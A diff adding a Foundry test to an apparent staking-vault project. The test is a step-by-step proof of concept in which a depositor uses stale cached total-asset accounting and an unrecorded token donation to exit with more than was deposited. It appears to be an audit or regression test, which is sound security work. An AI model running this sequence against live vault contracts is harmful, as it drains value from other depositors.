@@ -346,6 +346,55 @@ contract StakedRailWithdrawalIntegrationTest is Test {
         assertEq(rail.balanceOf(requests.requests(id).bag), payout);
     }
 
+    function testCachedAccountingLetsLaterDepositorExtractUnaccountedRailDonationAsQueuedRail() external {
+        uint256 bootstrapDeposit = 5000 ether;
+        uint256 queuedRailBootstrap = 1000 ether;
+        uint256 donation = 1000 ether;
+        uint256 attackerDeposit = 1000 ether;
+
+        // Seed both vaults before switching stRAIL from live to cached accounting.
+        _deposit(alice, bootstrapDeposit);
+        assertEq(processor.rebalanceStaking(5), 5);
+        address[] memory targets = new address[](1);
+        uint256[] memory values = new uint256[](1);
+        bytes[] memory data = new bytes[](1);
+        targets[0] = address(strategy);
+        data[0] = abi.encodeCall(StakedRailStrategy.queuePosition, ());
+        vm.prank(address(processor));
+        strategy.processor(targets, values, data);
+        assertEq(qRail.balanceOf(address(strategy)), queuedRailBootstrap);
+
+        strategy.grantRole(strategy.ASSET_MANAGER_ROLE(), address(this));
+        strategy.setAlwaysComputeTotalAssets(false);
+        strategy.revokeRole(strategy.ASSET_MANAGER_ROLE(), address(this));
+        assertFalse(strategy.alwaysComputeTotalAssets());
+        assertEq(strategy.totalAssets(), bootstrapDeposit);
+
+        // The donation is real backing but remains absent from cached total assets.
+        deal(address(rail), alice, donation);
+        vm.prank(alice);
+        assertTrue(rail.transfer(address(strategy), donation));
+        assertEq(strategy.totalAssets(), bootstrapDeposit);
+
+        // Bob receives shares using the stale, pre-donation exchange rate.
+        _deposit(bob, attackerDeposit);
+        assertEq(strategy.balanceOf(bob), attackerDeposit);
+        assertEq(strategy.totalAssets(), bootstrapDeposit + attackerDeposit);
+
+        // Accounting now recognizes the donation and revalues Bob's already-minted shares.
+        strategy.processAccounting();
+        assertEq(strategy.totalAssets(), bootstrapDeposit + donation + attackerDeposit);
+
+        vm.startPrank(bob);
+        strategy.approve(address(processor), attackerDeposit);
+        uint256 queuedRailReceived = processor.exitToQueuedRail(attackerDeposit, bob, 1);
+        vm.stopPrank();
+
+        assertEq(strategy.balanceOf(bob), 0);
+        assertGt(queuedRailReceived, attackerDeposit);
+        assertGt(qRail.convertToAssets(queuedRailReceived), attackerDeposit);
+    }
+
     function _deposit(address account, uint256 amount) internal {
         deal(address(rail), account, amount);
         vm.startPrank(account);
